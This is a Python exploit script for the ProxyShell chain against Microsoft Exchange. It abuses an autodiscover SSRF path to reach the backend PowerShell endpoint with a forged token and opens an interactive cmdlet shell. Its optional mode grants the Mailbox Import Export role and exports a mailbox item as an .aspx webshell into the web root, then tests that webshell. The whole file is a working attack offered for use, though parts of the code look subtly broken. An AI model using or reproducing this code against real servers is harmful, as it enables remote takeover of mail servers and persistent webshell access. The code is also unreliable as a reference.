import random
import string
import requests
import re
import threading
import sys
import time
import base64
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from functools import partial
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from struct import *

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
	print("Start wsman Server")

def rand_string(n=3):
    return 'ed'.join(random.choices(string.ascii_lowercase, k=n))

def rand_port(n=4):
    return ''.join(random.choices(string.digits, k=n))
p=int(rand_port())#start wsman server port

class proxyshell:
	def __init__(self, exchange_url, email, verify=False):
		self.token
		self.email = email
		self.exchange_url = exchange_url if exchange_url.startswith('https://') else f'https://{exchange_url}'
		self.rand_email = f'{rand_string()}@{rand_string()}.{rand_string(3)}'
		self.admin_sid = None
		self.legacydn = None
		self.rand_subj = rand_string(16)
		self.session = requests.Session()
		self.session.verify = verify
	def post(self,endpoint, data, headers={}):
		# print("endpoint:"+endpoint) powershell token 
		# print("data::"+data) wsman_post_data
		print("sending wsman")
		if 'powershell' in endpoint:
			path = f"/autodiscover/autodiscover.json?@evil.corp{endpoint}&Email=autodiscover/autodiscover.json%3F@evil.corp"
		else:
			path = f"/autodiscover/autodiscover.json?@evil.corp{endpoint}?&Email=autodiscover/autodiscover.json%3F@evil.corp"
		url = f'{self.exchange_url}{path}'
		r=requests.Session()
		r = r.post(
			url=url,
			data=data,
			headers=headers,
			verify=False
			)

		return r
class PwnServer(BaseHTTPRequestHandler):
    def __init__(self, proxyshell, *args, **kwargs):
        self.proxyshell = proxyshell
        # self.proxyshell.token="VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTAhlY2hvZFxhZFUqUy0xLTUtMjEtODAzNzM4MzY5LTcwNjM3OTYwLTM3NjUyMDc2NDgtNTAwRwEAAAAHAAAADFMtMS01LTMyLTU0NEUAAAAA"
        # self.proxyshell.exchange_url="https://mail.echod.com"
        super().__init__(*args, **kwargs)

    def do_POST(self):
        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
        powershell_url = f'/powershell/?X-Rps-CAT={self.proxyshell.token}'
        length = int(self.headers['content-length'])
        content_type = self.headers['content-type']
        post_data = self.rfile.read(length).decode()
        post_data = re.sub('<wsa:To>(.*?)</wsa:To>', '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>', post_data)
        post_data = re.sub('<wsman:ResourceURI s:mustUnderstand="true">(.*?)</wsman:ResourceURI>', '<wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>', post_data)
        
        headers = {
            'Content-Type': content_type
        }

        r = self.proxyshell.post(
        	proxyshell,
            powershell_url,
            post_data,
            headers
        )
        resp = r.content
        #print(resp) wsman response
        self.send_response(200)
        self.end_headers()
        self.wfile.write(resp)

def start_server(proxyshell, port):

    handler = partial(PwnServer, proxyshell)
    server = ThreadedHTTPServer(('', port), handler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()

def shell(command, port):
    # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
    if command.lower() in ['exit', 'quit']:
        exit()
    wsman = WSMan("127.0.0.1", username='', password='', ssl=False, port=port, auth='basic', encryption='never')
    with RunspacePool(wsman) as pool:
        ps = PowerShell(pool)
        ps.add_script(command)
        output = ps.invoke()

    print("OUTPUT:\n%s" % "\n".join([str(s) for s in output]))
    print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))


def write_shell(url,user):
	webshell_name=rand_string()+".aspx"
	shell_path=f'\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\aspnet_client\\{webshell_name}'
	shell(f'New-ManagementRoleAssignment -Role "Mailbox Import Export" -User "{user}"', p)## Add "Mailbox Import Export
	shell('Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest -Confirm:$false', p) ## Remove-MailboxExportRequest clean Request
	shell(f'New-MailboxExportRequest -Mailbox {user} -IncludeFolders ("#Drafts#") -ContentFilter "(Subject -eq \'microsoft\')" -ExcludeDumpster -FilePath "{shell_path}"', p)
	url=url+"/aspnet_client/"+webshell_name+"?cmd=Response.Write('eeeeeeeeeeeeeeeeeeee')"
	print("Test shell.....")
	time.sleep(5)
	r=requests.get(url,verify=False,timeout=7)
	if('eeeeeeeeeeeeeeeeeeee' in r.text):
		print(url+"   shell is ok")
	elif('system.web' in r.text):
		print(url+"   shell write ok  But no Runing   Are you send webshell_mail?")
	else:
		print(url+"   shell write bad")

def start_cmdlet(url,token):
	pshell=proxyshell
	pshell.token=token
	pshell.exchange_url=url
	start_server(pshell, p)


if __name__ == '__main__':
	#start_cmdlet("https://mail.echod.com","VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBdBZG1pbmlzdHJhdG9yQGVjaG9kLmNvbVUqUy0xLTUtMjEtODAzNzM4MzY5LTcwNjM3OTYwLTM3NjUyMDc2NDgtNTAwRwEAAAAHAAAADFMtMS01LTMyLTU0NEUAAAAA")
	if len(sys.argv) > 2:
		url=sys.argv[1]
		user=sys.argv[2]
		token=sys.argv[3]
		start_cmdlet(url,token)
		try:
			if sys.argv[4] == "shell":
				write_shell(url,user)
		except:
			pass
	else:
		print("python mail.example.com admin@example.com token (|shell)")
		exit()
	try:
		while True:
			command=input("Cmdlet:")
			shell(command,p)
	except:
		pass